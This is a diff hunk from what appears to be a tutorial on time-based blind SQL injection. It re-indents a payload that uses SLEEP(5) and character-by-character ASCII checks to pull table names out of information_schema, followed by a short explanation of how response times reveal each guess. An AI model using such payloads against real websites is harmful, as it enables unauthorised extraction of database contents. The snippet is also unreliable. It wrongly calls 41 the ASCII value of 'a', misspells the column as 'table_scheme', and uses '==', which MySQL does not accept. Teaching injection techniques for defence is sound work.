@@ -25,16 +25,16 @@ SELECT x,y
 FROM z 
 WHERE z.id=10 
 AND IF( 
-	ASCII(
-		SUBSTRING(	
-			(SELECT GROUP_CONCAT(table_name) 
-			FROM information_schema.tables 
-			WHERE table_scheme = database()),
-			1,1
-		)
-	) == 41,
-	SLEEP(5),
-	NULL
+    ASCII(
+        SUBSTRING(	
+            (SELECT GROUP_CONCAT(table_name) 
+	    FROM information_schema.tables 
+	    WHERE table_scheme = database()),
+	    1,1
+        )
+    ) == 41,
+    SLEEP(5),
+    NULL
 )
 ```
 The inner SELECT may return any string, in this case, a concatenation of all table names. Then the IF-statement tests if the first character of this string is equal to 41 (which is the ascii value for 'a'). If this is the case, the database will go sleepy-time for 5 seconds. But if the website is responding quickly, we guessed the first letter wrong. We monitor the response-times closely to see if we have guessed correctly.
